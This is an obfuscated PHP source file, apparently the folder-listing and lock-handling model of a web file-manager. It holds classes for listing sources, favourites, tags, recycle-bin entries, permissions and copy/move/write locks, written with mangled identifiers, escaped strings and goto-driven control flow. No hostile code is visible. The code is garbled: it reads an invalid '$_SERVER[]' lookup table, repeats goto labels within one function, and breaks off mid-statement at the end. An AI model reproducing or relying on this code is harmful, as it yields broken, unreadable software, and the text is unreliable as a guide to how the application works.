<?php
 goto bЬ; Bݾ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\143\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\155\x65" => "\x69\x6f\137\163\x6f\165\x72\x63\x65\137\155\x65\x74\x61", "\155\x65\164\141\106\x69\145\154\x64" => "\x73\x6f\165\162\x63\x65\x49\104"); protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\x6e\163\145\162\164", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\143\x72\145\141\164\145\124\x69\x6d\145", "\x74\x69\155\x65", "\x69\156\163\x65\162\164", "\146\x75\x6e\143\x74\x69\157\x6e"), array("\x76\151\x65\167\124\151\155\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\164", "\x66\x75\156\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($C) { return $this->listSource(array($_SERVER[][394] => $C)); } public function typeName($aɑ) { static $C = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $C[$aɑ . $_SERVER[][33]]; } public function sourceListInfo($Bü, $D򯄗 = false) { goto FՒ; eȰ˿: return array_to_keyvalue($C, $D[395]); goto bܶ; FՒ: $D =& $_SERVER[]; $Bü = $Bü ? $Bü : array(); $Bü = array_filter(array_unique($Bü)); goto fᐉ; fᐉ: if (!$Bü) { return array(); } $C = $this->where(array($D[395] => array($D[7], $Bü)))->select(); $this->_listDataApply($C, $D򯄗); goto eȰ˿; bܶ: } public function pathInfoFilter(&$d) { goto a␻; e: $d = array_field_key($d, $a㲏); return $d; goto b; fê: static $Aص = false; if (!$f܌) { goto b; b: $e = $aՂ[399]; $Bɦق = explode($aՂ[47], $e); $f܌ = explode($aՂ[47], $a); goto AȂ; b: $a = $aՂ[396]; $a .= $aՂ[397]; $a .= $aՂ[398]; goto b; AȂ: $f = array(); foreach ($f܌ as $d) { if (in_array($d, $Bɦق)) { continue; } $f[] = $d; } $Aص = explode($aՂ[47], $aՂ[400]); goto C앤؄; C앤؄: } foreach ($Aص as $f) { if (isset($d[$f])) { $d[$f] = intval($d[$f]); } } goto EƋ; Bטّ: if ($d[$aՂ[403]] != 1) { $d[$aՂ[168]] = $d[$aՂ[405]]; unset($d[$aՂ[405]]); } $a㲏 = $f܌; if (isset($d[$aՂ[406]]) && $d[$aՂ[406]][$aՂ[407]] == -1) { $a㲏 = $f; } goto e; EƋ: $d[$aՂ[76]] = $aՂ[401] . $d[$aՂ[395]] . $aՂ[402]; $d[$aՂ[29]] = $d[$aՂ[403]] == 1 ? $aՂ[77] : $aՂ[193]; $d[$aՂ[404]] = $this->typeName($d[$aՂ[404]]); goto Bטّ; a␻: $aՂ =& $_SERVER[]; static $f܌ = false; static $f = false; goto fê; b: } public function listUserFav() { goto Fզ; E: foreach ($a as &$cٕ) { $cٕ = array($A􅉡[412] => $cٕ[$A􅉡[393]], $A􅉡[413] => $cٕ[$A􅉡[28]], $A􅉡[414] => $cٕ[$A􅉡[76]], $A􅉡[415] => $cٕ[$A􅉡[29]], $A􅉡[416] => $cٕ[$A􅉡[194]], $A􅉡[417] => $cٕ[$A􅉡[84]]); if ($cٕ[$A􅉡[29]] == $A􅉡[409] && $f[$cٕ[$A􅉡[76]]]) { $cٕ[$A􅉡[85]] = $f[$cٕ[$A􅉡[76]]]; } } unset($cٕ); return $a; goto f; eѸ: $e̋ƙ = array_to_keyvalue($e̋ƙ, $A􅉡[33], $A􅉡[76]); if ($e̋ƙ) { $f = $this->listSource(array($A􅉡[410] => array($A􅉡[411], $e̋ƙ))); } $f = array_to_keyvalue($f[$A􅉡[367]], $A􅉡[395]); goto E; Fզ: $A􅉡 =& $_SERVER[]; $a = Model($A􅉡[408])->listData(); $e̋ƙ = array_filter_by_field($a, $A􅉡[29], $A􅉡[409]); goto eѸ; f: } public function listUserTag($A) { goto FȂ; dşĸ: if (!$dو || count($A޷ګ) == $dو[$CӐɝ[364]][$CӐɝ[365]]) { return $dو; } $Aݒʬ = array(); $a = array_to_keyvalue($dو[$CӐɝ[75]], $CӐɝ[33], $CӐɝ[395]); goto c; FȂ: $CӐɝ =& $_SERVER[]; if ($A && !is_array($A)) { $A = array($A); } $dϱ = Model($CӐɝ[418])->listData(); goto f; E: foreach ($Bퟄ؋ as $fΜ => $B븆) { $fÐ = !0; if (!$A) { $A޷ګ[] = $fΜ; continue; } foreach ($A as $eʑޥ) { if (!in_array($eʑޥ, $B븆)) { $fÐ = !1; break; } } if ($fÐ) { $A޷ګ[] = $fΜ; } } if (!$A޷ګ) { return array(); } $dو = $this->listSource(array($CӐɝ[410] => array($CӐɝ[411], $A޷ګ))); goto dşĸ; f: $Bퟄ؋ = array(); foreach ($dϱ as $f͞) { $Eė = $f͞[$CӐɝ[76]]; if (!$Eė) { continue; } if (!isset($Bퟄ؋[$Eė])) { $Bퟄ؋[$Eė] = array(); } $Bퟄ؋[$Eė][] = $f͞[$CӐɝ[419]]; } $A޷ګ = array(); goto E; c: $E唹 = array_to_keyvalue($dو[$CӐɝ[74]], $CӐɝ[33], $CӐɝ[395]); $Cՠ = array_merge($E唹, $a); foreach ($A޷ګ as $Eė) { if (!in_array($Eė, $Cՠ)) { $Aݒʬ[] = $Eė; } } goto bأ٪; bأ٪: if ($Aݒʬ) { Model($CӐɝ[420])->removeBySource($Aݒʬ); } return $dو; goto F凪; F凪: } public function listUserRecycle() { $E =& $_SERVER[]; $Bؘ = Model($E[421])->listData(); if (!$Bؘ) { return array(); } $dʂ = array($E[410] => array($E[411], $Bؘ), $E[422] => 1); return $this->listSource($dʂ); } public function listSource($Dز, $f齚 = 3000) { goto cʰ; b檔: $bࡒݶ = $this->field($E)->_makeOrder()->where($Dز)->selectPage($f齚); $this->_listDataApply($bࡒݶ[$eݕč[367]]); $this->_listMake($bࡒݶ); goto B; cʰ: $eݕč =& $_SERVER[]; if (!isset($Dز[$eݕč[423]])) { $Dز[$eݕč[423]] = 0; } $E = $eݕč[424]; goto b檔; B: return $bࡒݶ; goto Bľ; Bľ: } protected function _makeOrder() { goto aᵌ; Dߎޚ: if ($DŔ == $E[28]) { } $Dؿ = $E[437] . $C[$DŔ] . $E[50] . $eҊ[$Aޮ]; return $this->order(rtrim(trim($Dؿ), $E[47])); goto BΦۊ; dؗ: $Aޮ = Input::get($E[436], $E[7], $dЍ, array_keys($eҊ)); if (!in_array($DŔ, array_keys($C))) { $DŔ = $E[28]; } if (!in_array($Aޮ, array_keys($eҊ))) { $DŔ = $E[428]; } goto Dߎޚ; aᵌ: $E =& $_SERVER[]; $fÂ = Model($E[425])->get($E[426]); $dЍ = Model($E[425])->get($E[427]); goto D; D: $eҊ = array($E[428] => $E[429], $E[430] => $E[431]); $C = array($E[28] => $E[28], $E[78] => $E[78], $E[168] => $E[405], $E[432] => $E[432], $E[433] => $E[434], $E[194] => $E[194], $E[84] => $E[84]); $DŔ = Input::get($E[435], $E[7], $fÂ, array_keys($C)); goto dؗ; BΦۊ: } protected function _listDataApplyItem($c, $eʬЏ = false) { $A = array($c); $this->_listDataApply($A, $eʬЏ); return $A[0]; } protected function _listDataApply(&$c좕, $b٢ = false) { goto C; B: $this->_listAppendUser($c좕); $this->_listFilterInfo($c좕, $b٢); goto DܘՓ; A: $this->_listAppendPath($c좕); $this->_listAppendAuth($c좕); $this->_listAppendSourceInfo($c좕, $c); goto B; aŽ: $c = array_unique($c); $this->_listSourceCache($c좕); if (!$b٢) { $this->_listAppendMeta($c좕, $c); $this->_listAppendFileMeta($c좕, $c); $this->_listAppendChildren($c좕, $c); } goto A; C: $F߻ =& $_SERVER[]; if (!$c좕) { $c좕 = array(); return; } $c = array_to_keyvalue($c좕, $F߻[33], $F߻[395]); goto aŽ; DܘՓ: } protected function _listSourceCache($e霦) { $a =& $_SERVER[]; foreach ($e霦 as $c֞) { self::$cacheSourceInfo[$a[438] . $c֞[$a[395]]] = $c֞; } } protected function _listFilterInfo(&$E, $C = false) { $F޷ =& $_SERVER[]; foreach ($E as &$d桼) { $d桼 = $this->pathInfoFilter($d桼); self::$cachePathInfo[$F޷[439] . intval($C) . $F޷[440] . $d桼[$F޷[395]]] = $d桼; } unset($d桼); } protected function _listMake(&$eŻ) { $A =& $_SERVER[]; $eŻ[$A[75]] = array(); $eŻ[$A[74]] = array(); foreach ($eŻ[$A[367]] as $FȞ) { $A = $FȞ[$A[403]] == 1 ? $A[75] : $A[74]; $eŻ[$A][] = $FȞ; } unset($eŻ[$A[367]]); } protected function _listAppendMeta(&$dˬ, $d) { goto E槅; e쒙: foreach ($C㏃ as $Dǂ) { if (!isset($CبǇ[$Dǂ[$f傺[395]]])) { $CبǇ[$Dǂ[$f傺[395]]] = array(); } if (in_array($Dǂ[$f傺[93]], $b슽)) { continue; } $CبǇ[$Dǂ[$f傺[395]]][$Dǂ[$f傺[93]]] = $Dǂ[$f傺[372]]; } foreach ($dˬ as &$F䥵) { $F䥵[$f傺[445]] = !1; if (isset($CبǇ[$F䥵[$f傺[395]]])) { $F䥵[$f傺[445]] = $CبǇ[$F䥵[$f傺[395]]]; } if ($this->fileIsLock($F䥵) && $F䥵[$f傺[406]]) { $b̯ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $F䥵[$f傺[406]][$f傺[407]] = AuthModel::authDisable($F䥵[$f傺[406]][$f傺[407]], $b̯); $F䥵[$f傺[406]][$f傺[446]][$f傺[406]] = $F䥵[$f傺[406]][$f傺[407]]; } } unset($F䥵); goto Dݐ˽; Dԍҋ: if (!$C㏃) { return; } $b슽 = array($f傺[443], $f傺[444]); $CبǇ = array(); goto e쒙; E槅: $f傺 =& $_SERVER[]; $eőӱ = array($f傺[410] => array($f傺[411], $d)); $C㏃ = Model($f傺[441])->field($f傺[442])->where($eőӱ)->select(); goto Dԍҋ; Dݐ˽: } protected function _listAppendFileMeta(&$E̿, $e켤) { goto Aý; cܩЇ: $A֐ = $A֐ ? $A֐ : array(); $b = array(); foreach ($A֐ as $c̿Î) { if (!isset($b[$c̿Î[$dא[447]]])) { $b[$c̿Î[$dא[447]]] = array(); } $b[$c̿Î[$dא[447]]][$c̿Î[$dא[93]]] = $c̿Î[$dא[372]]; } goto B; B: foreach ($E̿ as &$Eܼ) { goto B·; B·: $Fɔ = $Eܼ[$dא[447]]; if (!$Fɔ || !is_array($DĽ[$Fɔ])) { continue; } $c = $DĽ[$Fɔ]; goto b; eͥ: if (isset($Eܼ[$dא[164]][$dא[163]])) { $Eܼ[$dא[163]] = json_decode($Eܼ[$dא[164]][$dא[163]], !0); unset($Eܼ[$dא[164]][$dא[163]]); } goto f܅; E: unset($DĽ[$Fɔ][$dא[76]]); $E؉ = is_array($b[$Fɔ]) ? $b[$Fɔ] : array(); $Eܼ[$dא[164]] = array_merge($E؉, $DĽ[$Fɔ]); goto eͥ; b: $c[$dא[78]] = $Eܼ[$dא[78]]; $c[$dא[28]] = $Eܼ[$dא[28]]; if (!isset(self::$cacheFileInfo[$dא[453] . $Fɔ])) { self::$cacheFileInfo[$dא[453] . $Fɔ] = array_merge(array(), $c); } goto E; f܅: } unset($Eܼ); goto C; e: if (!$bӐĄՃ) { return; } $d = array($dא[448] => array($dא[411], $bӐĄՃ)); $aͫټ = $dא[449]; goto E慍; E慍: $DĽ = Model($dא[450])->field($aͫټ)->where($d)->select(); $DĽ = array_to_keyvalue($DĽ, $dא[447]); $A֐ = Model($dא[451])->field($dא[452])->where($d)->select(); goto cܩЇ; Aý: $dא =& $_SERVER[]; $bӐĄՃ = array_to_keyvalue($E̿, $dא[33], $dא[447]); $bӐĄՃ = array_filter(array_unique($bӐĄՃ)); goto e; C: } protected function _listAppendSourceInfo(&$b, $d䦄) { goto F¥ϐݸ; F¥ϐݸ: $e􄐸 =& $_SERVER[]; if (!defined($e􄐸[454])) { return; } $eً = Model($e􄐸[455])->listData(); goto F˧; c: $cڶ = array_to_keyvalue($eً, $e􄐸[393]); $DŋÐ = array_to_keyvalue_group($a܊, $e􄐸[76], $e􄐸[419]); $f썱 = array_to_keyvalue($cő, $e􄐸[76]); goto fƭ; fЋđ: return $b; goto B; fƭ: $F󛫫 = array_to_keyvalue_group($c, $e􄐸[395]); foreach ($b as &$CПʄ) { $CПʄ[$e􄐸[85]] = array($e􄐸[457] => 0, $e􄐸[458] => 0, $e􄐸[459] => 0); if (isset($f썱[$CПʄ[$e􄐸[395]]])) { $CПʄ[$e􄐸[85]][$e􄐸[460]] = 1; $CПʄ[$e􄐸[85]][$e􄐸[461]] = $f썱[$CПʄ[$e􄐸[395]]][$e􄐸[28]]; } if (isset($DŋÐ[$CПʄ[$e􄐸[395]]])) { $CПʄ[$e􄐸[85]][$e􄐸[462]] = array(); foreach ($DŋÐ[$CПʄ[$e􄐸[395]]] as $bℷ) { $Cר҉ = $cڶ[$bℷ]; $CПʄ[$e􄐸[85]][$e􄐸[462]][] = array($e􄐸[463] => $Cר҉[$e􄐸[393]], $e􄐸[413] => $Cר҉[$e􄐸[28]], $e􄐸[464] => $Cר҉[$e􄐸[465]]); } } if (isset($F󛫫[$CПʄ[$e􄐸[395]]])) { $CПʄ[$e􄐸[85]][$e􄐸[466]] = array(); foreach ($F󛫫[$CПʄ[$e􄐸[395]]] as $b) { $CПʄ[$e􄐸[85]][$e􄐸[466]] = array($e􄐸[467] => $b[$e􄐸[468]], $e􄐸[469] => $b[$e􄐸[470]], $e􄐸[471] => $b[$e􄐸[395]], $e􄐸[472] => $b[$e􄐸[473]], $e􄐸[474] => $b[$e􄐸[475]], $e􄐸[476] => $b[$e􄐸[476]], $e􄐸[477] => $b[$e􄐸[477]]); } } } unset($CПʄ); goto fЋđ; F˧: $a܊ = Model($e􄐸[418])->listData(); $cő = Model($e􄐸[408])->listData(); $c = Model($e􄐸[456])->listSimple(); goto c; B: } protected function _listAppendChildren(&$EĲ, $aԴ) { goto F; e鑲: $A૵ = array(); foreach ($f͉ as $fΈ) { $bϕ暂 = $fΈ[$Aƹ[478]]; $fޱ = $fΈ[$Aƹ[403]] == $Aƹ[87] ? $Aƹ[204] : $Aƹ[203]; if (!isset($A૵[$bϕ暂])) { $A૵[$bϕ暂] = array($Aƹ[203] => 0, $Aƹ[204] => 0); } $A૵[$bϕ暂][$fޱ] += $fΈ[$Aƹ[480]]; } foreach ($EĲ as &$Cǅڟ) { if (!$Cǅڟ[$Aƹ[403]]) { continue; } $Aׄ = is_array($A૵[$Cǅڟ[$Aƹ[395]]]) ? $A૵[$Cǅڟ[$Aƹ[395]]] : $C; $Cǅڟ[$Aƹ[204]] = $Aׄ[$Aƹ[204]]; $Cǅڟ[$Aƹ[203]] = $Aׄ[$Aƹ[203]]; unset($Cǅڟ[$Aƹ[405]]); } goto Cǵ; Cʔ: $eĊΗČ = array($Aƹ[478] => array($Aƹ[7], $aء)); $A = array($Aƹ[478], $Aƹ[403], $Aƹ[479] => $Aƹ[480]); $f͉ = $this->field($A)->where($eĊΗČ)->group($Aƹ[481])->select(); goto e鑲; D霗ξ: foreach ($EĲ as &$Cǅڟ) { if (!$Cǅڟ[$Aƹ[403]]) { continue; } $aء[] = $Cǅڟ[$Aƹ[395]]; } unset($Cǅڟ); if (!$aء) { return; } goto Cʔ; Cǵ: unset($Cǅڟ); goto Dۑ׸; F: $Aƹ =& $_SERVER[]; $aء = array(); $C = array($Aƹ[203] => 0, $Aƹ[204] => 0); goto D霗ξ; Dۑ׸: } protected function _listAppendAuth(&$aĿ) { goto bəԬ; c: $e΂ = Model($C׾[482])->getSourceList($A, $F吠ێ); foreach ($aĿ as $Aٵ => &$E͋ի) { $E͋ի[$C׾[406]] = $e΂[$E͋ի[$C׾[395]]]; if (!$E͋ի[$C׾[406]] && $E͋ի[$C׾[404]] == self::TYPE_GROUP) { $E͋ի[$C׾[406]] = Action($C׾[483])->pathGroupAuthMake($E͋ի[$C׾[484]]); if (!$E͋ի[$C׾[406]] && !_get($GLOBALS, $C׾[485])) { $E͋ի[$C׾[196]] = !1; $E͋ի[$C׾[195]] = !1; } } if ($E͋ի[$C׾[406]]) { $E͋ի[$C׾[196]] = AuthModel::authCheckEdit($E͋ի[$C׾[406]][$C׾[407]]); $E͋ի[$C׾[195]] = AuthModel::authCheckView($E͋ի[$C׾[406]][$C׾[407]]); } $this->groupPathDisplay($E͋ի); } unset($E͋ի); goto aϨ; bəԬ: $C׾ =& $_SERVER[]; if (!defined($C׾[454])) { return; } $A = array(); goto E; E: foreach ($aĿ as $E͋ի) { if ($E͋ի[$C׾[404]] == self::TYPE_GROUP) { $A[] = $E͋ի[$C׾[395]]; } } if (!$A) { return; } $F吠ێ = array_to_keyvalue($aĿ, $C׾[395]); goto c; aϨ: } public function groupPathDisplay(&$b) { goto A᳦ǥ; A᳦ǥ: $f =& $_SERVER[]; if ($b[$f[404]] != self::TYPE_GROUP) { return; } $a = Model($f[486])->getInfo($b[$f[484]]); goto dۣ; Fֶ: $b[$f[492]] = $Aӡ . $a[$f[85]][$f[395]]; goto f悭; C: $b[$f[488]] = $a[$f[478]]; $b[$f[489]] = $a[$f[487]]; $b[$f[490]] = $a[$f[491]]; goto Fֶ; dۣ: $CЊ = $this->parentLevelArray($a[$f[487]]); $Aӡ = $f[33]; foreach ($CЊ as $b񓝎ղ) { $D = Model($f[486])->getInfo($b񓝎ղ); $Aӡ .= $D[$f[85]][$f[395]] . $f[47]; } goto C; f悭: } protected function _listAppendPath(&$bٙ) { goto b߃; B: $bۼ = array(); foreach ($bٙ as &$fߌ) { $bꮳ = $fߌ[$A̱[403]] == $A̱[87]; if ($bꮳ) { $b[$fߌ[$A̱[395]]] = $fߌ[$A̱[28]]; } if (isset($bۼ[$fߌ[$A̱[487]]])) { continue; } $bۼ[$fߌ[$A̱[487]]] = !0; $A𑢧 = $this->parentLevelArray($fߌ[$A̱[487]]); foreach ($A𑢧 as $f => $Bֈ) { if ($f != 0 && !isset($b[$Bֈ])) { $f葽ǐ[] = $Bֈ; } } } unset($fߌ); goto aע; aȈΧ: unset($fߌ); return $bٙ; goto Bٍ; aע: $f葽ǐ = array_unique($f葽ǐ); if (count($f葽ǐ) > 0) { $F = array($A̱[410] => array($A̱[411], $f葽ǐ)); if (count($f葽ǐ) == 1) { $dّ = $this->sourceInfo($f葽ǐ[0]); $Dȼ = is_array($dّ) ? array($dّ) : !1; } else { $Dȼ = $this->field($A̱[493])->where($F)->select(); } if (!$Dȼ) { $Dȼ = array(); } foreach ($Dȼ as $eۙ) { $b[$eۙ[$A̱[395]]] = $eۙ[$A̱[28]]; } } $DŶ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto E; E: $fԭƿ = array(); $E = array(); foreach ($bٙ as &$fߌ) { goto fގ; bڜ: $fߌ[$A̱[495]] = str_replace($A̱[496], $A̱[8], $Eʅ); $dʭɺ = trim($fߌ[$A̱[495]], $A̱[8]); if ($fߌ[$A̱[478]] == $A̱[191] && $dʭɺ) { $fߌ[$A̱[28]] = $dʭɺ; } goto B߇; fގ: $e̐鍩 = $fߌ[$A̱[487]]; if (isset($E[$e̐鍩])) { $Eʅ = $fԭƿ[$e̐鍩]; } else { $A𑢧 = $this->parentLevelArray($fߌ[$A̱[487]]); $Bۤʲ = $A̱[494] . $fߌ[$A̱[404]] . $A̱[440] . $fߌ[$A̱[484]]; if ($fԭƿ[$Bۤʲ]) { $Eʅ = $fԭƿ[$Bۤʲ]; } else { $Eʅ = $this->_listAppendPathRoot($fߌ, $A𑢧); $fԭƿ[$Bۤʲ] = $Eʅ; } foreach ($A𑢧 as $f => $Bֈ) { if ($f == 0 && $Eʅ && $fߌ[$A̱[404]] == self::TYPE_GROUP) { continue; } if (isset($b[$Bֈ])) { $Eʅ .= $b[$Bֈ] . $A̱[8]; } } if ($A𑢧) { $Eʅ .= $fߌ[$A̱[28]]; } $fԭƿ[$e̐鍩] = $Eʅ; } if ($fߌ[$A̱[403]]) { $Eʅ .= $A̱[8]; } goto bڜ; B߇: if (intval($fߌ[$A̱[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($fߌ, $A𑢧, $DŶ); } goto A凋; A凋: } goto aȈΧ; b߃: $A̱ =& $_SERVER[]; static $b = array(); $f葽ǐ = array(); goto B; Bٍ: } private function _listAppendPathRecycle(&$Dͱ, $aθ, $fϗ) { goto Eޟ; d񘧯: if ($Dͱ[$eύ[395]] == $fϗ) { $Dͱ[$eύ[487]] = $eύ[498]; $Dͱ[$eύ[478]] = $eύ[191]; $Dͱ[$eύ[28]] = LNG($eύ[497]); } $Dͱ[$eύ[499]] = $eύ[500]; goto C; Eޟ: $eύ =& $_SERVER[]; if (!in_array($fϗ, $aθ) && $Dͱ[$eύ[395]] != $fϗ) { return; } $Aȅ΅ = explode($eύ[8], trim($Dͱ[$eύ[495]], $eύ[8])); goto fˋݴ; fˋݴ: $b = implode($eύ[8], array_slice($Aȅ΅, 2)); $Dͱ[$eύ[495]] = $eύ[8] . LNG($eύ[497]) . $eύ[8] . ltrim($b, $eύ[8]); $Dͱ[$eύ[487]] = $eύ[498] . implode($eύ[47], array_slice($aθ, 1)) . $eύ[47]; goto d񘧯; C: } protected function _listAppendPathRoot(&$c폂̾, $e) { $aƊ =& $_SERVER[]; $bԼ = $aƊ[33]; if ($c폂̾[$aƊ[404]] == self::TYPE_USER) { if (defined($aƊ[454]) && $c폂̾[$aƊ[484]] == USER_ID) { $bԼ = LNG($aƊ[501]); if (!$e) { $c폂̾[$aƊ[28]] = $bԼ; } } else { $Eӌ = Model($aƊ[502])->getInfoSimple($c폂̾[$aƊ[484]]); $bԼ = LNG($aƊ[503]) . $aƊ[160] . $Eӌ[$aƊ[28]] . $aƊ[504]; } } else { if ($c폂̾[$aƊ[404]] == self::TYPE_GROUP) { $Eӌ = Model($aƊ[486])->getInfoSimple($c폂̾[$aƊ[484]]); $bԼ = $Eӌ[$aƊ[28]]; } else { if ($c폂̾[$aƊ[404]] == self::TYPE_SYSTEM) { $bԼ = $aƊ[505]; } } } $bԼ = $bԼ ? $aƊ[8] . $bԼ . $aƊ[8] : $aƊ[8]; return $bԼ; } protected function _listAppendUser(&$Eι) { goto dȊ; fš֒: unset($F۬); goto fֺ̤; dȊ: $Aɷ =& $_SERVER[]; $fꐠ = array_to_keyvalue($Eι, $Aɷ[33], $Aɷ[432]); $aޤ¨ = array_to_keyvalue($Eι, $Aɷ[33], $Aɷ[434]); goto A; A: $a = array_merge($fꐠ, $aޤ¨); $BǶ = Model($Aɷ[506])->userListInfo($a); foreach ($Eι as &$F۬) { $bҾ = $F۬[$Aɷ[432]]; $F۬[$Aɷ[432]] = $BǶ[$bҾ] ? $BǶ[$bҾ] : !1; $bҾ = $F۬[$Aɷ[434]]; $F۬[$Aɷ[434]] = $BǶ[$bҾ] ? $BǶ[$bҾ] : !1; if (isset($F۬[$Aɷ[445]]) && $F۬[$Aɷ[445]][$Aɷ[507]]) { $aʐ = $GLOBALS[$Aɷ[6]][$Aɷ[88]][$Aɷ[508]]; if ($F۬[$Aɷ[445]][$Aɷ[509]] <= time() - $aʐ) { $this->metaSet($F۬[$Aɷ[395]], $Aɷ[507], null); $this->metaSet($F۬[$Aɷ[395]], $Aɷ[509], null); unset($F۬[$Aɷ[445]][$Aɷ[507]]); continue; } $b = $F۬[$Aɷ[445]][$Aɷ[507]]; $F۬[$Aɷ[445]][$Aɷ[510]] = Model($Aɷ[506])->getInfoSimpleOuter($b); } } goto fš֒; fֺ̤: } public function parentLevelArray($fʹ) { $E =& $_SERVER[]; $fʹ = explode($E[47], trim($fʹ, $E[47])); return array_remove_value($fʹ, $E[191]); } public function listAll($B) { goto E; C: $f̼ǥ = array(); foreach ($b as $fڐ => $EڏƄ) { goto EΓ; C: for ($eȳ = 0; $eȳ < count($Fʆ뱷); $eȳ++) { $D .= $b[$Fʆ뱷[$eȳ]][$Aڣŭ[28]] . $Aڣŭ[8]; } $D .= $EڏƄ[$Aڣŭ[28]]; if ($EڏƄ[$Aڣŭ[403]]) { $D .= $Aڣŭ[8]; } goto Eᎎ; Eᎎ: $D = str_replace($Aڣŭ[496], $Aڣŭ[8], $D); $D = str_replace($Aڣŭ[496], $Aڣŭ[8], $D); $cǝý = array($Aڣŭ[414] => str_replace($Aڣŭ[496], $Aڣŭ[8], $D), $Aڣŭ[517] => intval($EڏƄ[$Aڣŭ[403]]), $Aڣŭ[85] => $this->pathInfoFilter($EڏƄ)); goto Bȿل; Bȿل: if (!$EڏƄ[$Aڣŭ[403]]) { $cǝý[$Aڣŭ[447]] = $EڏƄ[$Aڣŭ[447]]; $cǝý[$Aڣŭ[86]] = $EڏƄ[$Aڣŭ[76]]; } $f̼ǥ[] = $cǝý; goto eƭѩ; EΓ: $Fʆ뱷 = $this->parentLevelArray($EڏƄ[$Aڣŭ[487]]); array_shift($Fʆ뱷); $D = $Fݲ; goto C; eƭѩ: } return $f̼ǥ; goto fߛ; Fդ: $b = array_to_keyvalue($b, $Aڣŭ[395]); $Fݲ = "\x2f{$F[$Aڣŭ[28]]}\57"; $Fݲ = $Fݲ == $Aڣŭ[496] ? $Aڣŭ[8] : $Fݲ; goto C; D: $this->_listAppendAuth($b); $this->_listAppendUser($b); $this->_listAppendPath($b); goto Fդ; E: $Aڣŭ =& $_SERVER[]; $F = $this->sourceInfo($B); $eơ = array($Aڣŭ[511] => array($Aڣŭ[512], $F[$Aڣŭ[487]] . $B . $Aڣŭ[513]), $Aڣŭ[514] => 0); goto fȨ̃; fȨ̃: $E = $Aڣŭ[515]; $A֧ = "\114\105\x46\124\40\112\117\111\x4e\x20{$this->tablePrefix}\151\157\137\146\x69\154\x65\40\x66\151\154\145\x20\x6f\x6e\x20\x73\x6f\x75\162\x63\145\56\146\x69\154\145\111\104\40\75\x20\146\x69\154\x65\x2e\x66\151\154\145\x49\x44"; $b = $this->alias($Aڣŭ[516])->field($E)->where($eơ)->join($A֧)->select(); goto D; fߛ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($A޹) { goto E䳙ӡ; E䳙ӡ: $Bަ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Bަ[518], $A޹); goto b; D: $this->_lockEvent($A޹, array($Bަ[521], $Bަ[522]), $BÈ); $this->_lockCheckEnd($Bަ[518], $A޹); goto Aڸ; b: $BÈ = 1; $this->_lockEvent($A޹, array($Bަ[519], $Bަ[520]), $BÈ); $this->_lockParent($A޹, array($Bަ[520]), $BÈ); goto D; Aڸ: } public function lockCopyEnd($A) { $F =& $_SERVER[]; if (!$this->allowLock()) { return; } $dܙ = 0; $this->_lockEvent($A, array($F[519], $F[520]), $dܙ); $this->_lockParent($A, array($F[520]), $dܙ); $this->_lockEvent($A, array($F[521], $F[522]), $dܙ); } public function lockWriteStart($A׍Ȥ, $AƻϺ = '') { goto e԰; cꇚ: $Aו = 1; $this->_lockKey($dĉﺍ[523] . $A׍Ȥ . $dĉﺍ[95] . $AƻϺ, $Aו); $this->_lockEvent($A׍Ȥ, array($dĉﺍ[518], $dĉﺍ[520]), $Aו); goto d; e԰: $dĉﺍ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($dĉﺍ[519], $A׍Ȥ); goto cꇚ; d: $this->_lockParent($A׍Ȥ, array($dĉﺍ[518], $dĉﺍ[520]), $Aו); $this->_lockCheckEnd($dĉﺍ[519], $A׍Ȥ); goto E߅; E߅: } public function lockWriteEnd($eژۃ, $a = '') { $Aͧϯ =& $_SERVER[]; if (!$this->allowLock()) { return; } $f֑ = 0; $this->_lockKey($Aͧϯ[523] . $eژۃ . $Aͧϯ[95] . $a, $f֑); $this->_lockEvent($eژۃ, array($Aͧϯ[518], $Aͧϯ[520]), $f֑); $this->_lockParent($eژۃ, array($Aͧϯ[518], $Aͧϯ[520]), $f֑); } public function lockMoveStart($dه) { goto dკ׌; Cɥ: $this->_lockParent($dه, array($fԗ[518], $fԗ[520]), $b܄); $this->_lockEvent($dه, array($fԗ[525], $fԗ[521], $fԗ[522]), $b܄); $this->_lockCheckEnd($fԗ[520], $dه); goto a; B: $b܄ = 1; $this->_lockKey($fԗ[524] . $dه, $b܄); $this->_lockEvent($dه, array($fԗ[518], $fԗ[519]), $b܄); goto Cɥ; dკ׌: $fԗ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($fԗ[520], $dه); goto B; a: } public function lockMoveEnd($Dڎ֠) { goto Cѕğ; Bʠ: $this->_lockEvent($Dڎ֠, array($f˦[525], $f˦[521], $f˦[522]), $Eï); goto C厇; dƥ: $this->_lockKey($f˦[524] . $Dڎ֠, $Eï); $this->_lockEvent($Dڎ֠, array($f˦[518], $f˦[519]), $Eï); $this->_lockParent($Dڎ֠, array($f˦[518], $f˦[520]), $Eï); goto Bʠ; Cѕğ: $f˦ =& $_SERVER[]; if (!$this->allowLock()) { return; } $Eï = 0; goto dƥ; C厇: } private function _lockCheck($b߃՞, $AϞ) { goto BԚ; BԚ: $c󣂿 =& $_SERVER[]; $FǶ = $this->sourceInfo($AϞ); $d = $b߃՞ . $c󣂿[95] . $AϞ; goto aυձ; b߃: CacheLock::setErrorMsg($c󣂿[160] . htmlspecialchars($FǶ[$c󣂿[28]]) . $c󣂿[504] . $A̅Ͻ); $this->_lockKey($d, 1); $this->_lockKey($d, 0); goto Aෟ; aυձ: $this->_lockTimeStart[$d] = timeFloat(); if 